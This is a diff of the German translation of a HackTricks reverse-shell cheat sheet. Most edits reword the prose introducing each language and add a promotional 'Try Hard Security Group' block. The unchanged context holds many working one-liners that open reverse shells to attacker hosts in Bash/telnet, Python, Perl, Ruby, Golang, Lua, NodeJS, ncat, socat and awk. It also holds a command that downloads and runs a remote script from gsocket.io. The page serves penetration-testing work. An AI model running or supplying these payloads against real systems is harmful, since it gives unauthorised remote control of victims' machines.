@@ -7,12 +7,20 @@
 Andere Möglichkeiten, HackTricks zu unterstützen:
 
 * Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
+* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) **und** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories senden.**
 
 </details>
+
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
 
 **Wenn Sie Fragen zu einer dieser Shells haben, können Sie sie mit** [**https://explainshell.com/**](https://explainshell.com) **überprüfen.**
 
@@ -63,7 +71,7 @@ Bei einer **Remote Code Execution (RCE)**-Verwundbarkeit in einer auf Linux basi
 
 Ein empfohlenes Tool für diesen Zweck ist [toboggan](https://github.com/n3rada/toboggan.git), das die Interaktion mit der Zielumgebung vereinfacht.
 
-Um toboggan effektiv zu nutzen, erstellen Sie ein auf den RCE-Kontext Ihres Zielsystems zugeschnittenes Python-Modul. Zum Beispiel könnte ein Modul mit dem Namen `nix.py` wie folgt strukturiert sein:
+Um toboggan effektiv zu nutzen, erstellen Sie ein auf den RCE-Kontext Ihres Zielsystems zugeschnittenes Python-Modul. Ein Modul mit dem Namen `nix.py` könnte beispielsweise wie folgt strukturiert sein:
 ```python3
 import jwt
 import httpx
@@ -119,7 +127,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet ist ein Netzwerkprotokoll, das verwendet wird, um eine Verbindung zu einem entfernten System herzustellen. Es ermöglicht die Interaktion mit dem entfernten System über die Befehlszeile. Telnet überträgt Daten im Klartext, was es anfällig für Man-in-the-Middle-Angriffe macht. Es wird empfohlen, sicherere Alternativen wie SSH zu verwenden.
+Telnet ist ein Netzwerkprotokoll, das verwendet wird, um eine Verbindung zu einem entfernten System herzustellen. Es ermöglicht die Interaktion mit dem entfernten System über eine textbasierte Schnittstelle. Telnet kann für administrative Aufgaben oder zum Testen der Erreichbarkeit eines Systems verwendet werden. Es ist wichtig zu beachten, dass Telnet unverschlüsselt ist und daher Sicherheitsrisiken birgt. Es wird empfohlen, sicherere Alternativen wie SSH zu verwenden.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -140,7 +148,7 @@ export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X
 ```
 ## Python
 
-Python ist eine vielseitige Programmiersprache, die von Hackern häufig verwendet wird, um Shell-Skripte zu schreiben und Systeme zu automatisieren. Python bietet eine breite Palette von Bibliotheken und Frameworks, die für verschiedene Hacking-Aufgaben nützlich sind. Es ist plattformunabhängig und einfach zu erlernen, was es zu einer beliebten Wahl für Hacker macht.
+Python ist eine vielseitige Programmiersprache, die von Hackern häufig verwendet wird, um Shell-Skripte zu schreiben und verschiedene Aufgaben im Zusammenhang mit Hacking und Pentesting zu automatisieren. Python bietet eine Vielzahl von Bibliotheken und Frameworks, die das Erstellen von Hacking-Tools erleichtern. Es ist plattformunabhängig und einfach zu erlernen, was es zu einer beliebten Wahl unter Hackern macht.
 ```bash
 #Linux
 export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
@@ -150,21 +158,21 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 ```
 ## Perl
 
-Perl ist eine beliebte Skriptsprache, die von Hackern häufig verwendet wird, um Shell-Skripte zu schreiben. Perl bietet leistungsstarke Funktionen für die Textverarbeitung und Systemverwaltung, was es zu einer nützlichen Sprache für das Hacking macht. Mit Perl können Hacker komplexe Aufgaben automatisieren und Systeme effizient manipulieren.
+Perl ist eine beliebte Skriptsprache, die von Hackern häufig verwendet wird, um Shell-Skripte zu schreiben und Systeme zu automatisieren. Es bietet leistungsstarke Funktionen für die Textverarbeitung und wird oft für das Erstellen von Exploits und Payloads verwendet.
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
 
-Ruby ist eine dynamische, objektorientierte Skriptsprache, die für die Entwicklung von Webanwendungen und Skripten verwendet wird. Ruby wird oft für die Erstellung von Webanwendungen mit dem Ruby on Rails Framework verwendet. Es bietet eine Vielzahl von Funktionen und ist für seine Einfachheit und Lesbarkeit bekannt.
+Ruby ist eine dynamische, objektorientierte Skriptsprache, die für die Entwicklung von Webanwendungen weit verbreitet ist. Es gibt verschiedene Shells, die mit Ruby verwendet werden können, darunter IRB (Interactive Ruby) und Pry. Diese Shells bieten eine interaktive Umgebung zum Ausführen von Ruby-Code und zum Testen von Skripten.
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## PHP
 
-PHP ist eine serverseitige Skriptsprache, die hauptsächlich für die Webentwicklung verwendet wird. Es kann in HTML eingebettet werden und wird häufig verwendet, um dynamische Webseiten oder Webanwendungen zu erstellen. PHP-Skripte werden auf dem Server ausgeführt, was bedeutet, dass der Client nur das Ergebnis der Skriptausführung sieht. PHP bietet eine Vielzahl von Funktionen und Frameworks, die Entwicklern helfen, leistungsstarke und komplexe Webanwendungen zu erstellen.
+PHP ist eine serverseitige Skriptsprache, die hauptsächlich für die Webentwicklung verwendet wird. PHP-Skripte werden auf dem Server ausgeführt, um dynamische Webseiten zu generieren. PHP kann in HTML-Code eingebettet werden und mit verschiedenen Datenbanken wie MySQL, PostgreSQL usw. interagieren.
 ```php
 // Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
 // Using this method may lead to instances where the connection reaches out to the listener and then closes.
@@ -185,19 +193,21 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while r
 p.waitFor()
 ```
 ## Ncat
+
+Ncat ist ein vielseitiges Netzwerk-Tool, das Funktionen wie Port-Scanning, Datenübertragung und Port-Weiterleitung bietet. Es kann auch als einfacher Webserver oder Reverse-Proxy verwendet werden. Ncat ist eine leistungsstarke Alternative zum traditionellen Netcat-Tool.
 ```bash
 victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
 ## Golang
 
-Golang, auch bekannt als Go, ist eine Open-Source-Programmiersprache, die von Google entwickelt wurde. Sie zeichnet sich durch Effizienz und schnelle Kompilierungszeiten aus. Golang wird häufig für die Entwicklung von Tools und Anwendungen im Bereich der Informationssicherheit verwendet.
+Golang, auch bekannt als Go, ist eine Open-Source-Programmiersprache, die von Google entwickelt wurde. Sie zeichnet sich durch Effizienz und Geschwindigkeit aus und wird häufig für die Entwicklung von Systemsoftware, Cloud-Diensten und Netzwerkanwendungen verwendet. Golang bietet eine starke Typisierung und eine einfache Syntax, die das Schreiben von Code erleichtert.
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 ## Lua
 
-Lua ist eine leistungsstarke, effiziente, leichtgewichtige und eingebettete Skriptsprache. Lua wird häufig für die Erweiterung von Anwendungen und die Automatisierung von Aufgaben verwendet. Lua-Skripte können in verschiedenen Anwendungen ausgeführt werden, um benutzerdefinierte Funktionen hinzuzufügen oder das Verhalten der Anwendung anzupassen. Lua bietet eine einfache Syntax und eine umfangreiche Standardbibliothek, die es zu einer beliebten Wahl für Entwickler macht. Lua kann auch als eigenständige Skriptsprache verwendet werden, um komplexe Aufgaben zu automatisieren oder Prototypen zu erstellen.
+Lua ist eine leistungsstarke, effiziente, leichtgewichtige, eingebettete Skriptsprache. Lua wird oft für die Erstellung von Skripten und Automatisierungsaufgaben in verschiedenen Anwendungen verwendet. Lua-Skripte können in vielen verschiedenen Umgebungen ausgeführt werden und sind aufgrund ihrer Flexibilität und Einfachheit bei Entwicklern beliebt. Lua wird auch häufig in der Spieleentwicklung und in anderen Bereichen eingesetzt, in denen Skripting erforderlich ist.
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -206,9 +216,7 @@ lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket")
 ```
 ## NodeJS
 
-### Reverse Shell
-
-Ein Reverse-Shell-Skript in Node.js kann verwendet werden, um eine Verbindung zu einem Angreifer-Server herzustellen. Dies ermöglicht dem Angreifer, Befehle auf dem Zielserver auszuführen.
+NodeJS ist eine Open-Source-Plattform, die auf der JavaScript-Laufzeitumgebung von Chrome basiert und es ermöglicht, serverseitige Anwendungen mit JavaScript zu erstellen. NodeJS wird häufig für die Entwicklung von Webanwendungen verwendet und bietet eine Vielzahl von Modulen, die die Entwicklung erleichtern.
 ```javascript
 (function(){
 var net = require("net"),
@@ -283,7 +291,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ## Awk
 
-Awk ist eine leistungsstarke Skriptsprache und ein Befehlszeilen-Interpreter, der häufig zum Verarbeiten und Analysieren von Textdateien in Unix- oder Linux-Umgebungen verwendet wird. Es ermöglicht das Extrahieren und Manipulieren von Daten, das Durchsuchen von Dateien nach Mustern und das Ausführen von Aktionen basierend auf diesen Mustern. Awk ist besonders nützlich für die Verarbeitung strukturierter Daten wie CSV-Dateien.
+Awk ist eine leistungsstarke Skriptsprache und ein Befehlszeilen-Tool, das häufig zum Analysieren und Verarbeiten von Textdateien in Unix- und Linux-Umgebungen verwendet wird. Es ermöglicht das Extrahieren und Manipulieren von Daten, das Durchsuchen von Dateien nach Mustern und das Ausführen von Aktionen basierend auf diesen Mustern. Awk ist besonders nützlich für die Verarbeitung strukturierter Daten wie CSV-Dateien.
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
@@ -303,7 +311,7 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | gre
 ```
 ## Gawk
 
-Gawk ist eine leistungsstarke Skriptsprache für die Datenverarbeitung und Textmanipulation in Unix- und Linux-Umgebungen. Es wird häufig verwendet, um Textdateien zu durchsuchen, zu extrahieren und zu transformieren. Gawk bietet eine Vielzahl von Funktionen, einschließlich eingebauter Funktionen und die Möglichkeit, benutzerdefinierte Funktionen zu definieren. Es ist ein äußerst nützliches Werkzeug für Hacker, um Daten zu analysieren und Skripte für verschiedene Zwecke zu erstellen.
+Gawk ist eine leistungsstarke Skriptsprache für die Datenverarbeitung und Textmanipulation in Unix- und Linux-Umgebungen. Es wird häufig verwendet, um Textdateien zeilenweise zu verarbeiten und Muster zu durchsuchen und zu extrahieren. Gawk bietet eine Vielzahl von Funktionen, einschließlich eingebauter Funktionen und die Möglichkeit, benutzerdefinierte Funktionen zu definieren. Es ist ein äußerst nützliches Werkzeug für Hacker, um Daten zu analysieren und Skripte für verschiedene Zwecke zu erstellen.
 ```bash
 #!/usr/bin/gawk -f
 
@@ -332,7 +340,7 @@ Dies wird versuchen, eine Verbindung zu Ihrem System über den Port 6001 herzust
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Um die umgekehrte Shell zu empfangen, können Sie Folgendes verwenden (die auf Port 6001 lauscht):
+Um die umgekehrte Shell zu erhalten, können Sie Folgendes verwenden (die auf Port 6001 lauscht):
 ```bash
 # Authorize host
 xhost +targetip
@@ -355,6 +363,12 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 * [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
 <details>
 
 <summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
@@ -362,7 +376,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 Andere Möglichkeiten, HackTricks zu unterstützen:
 
 * Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
+* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.
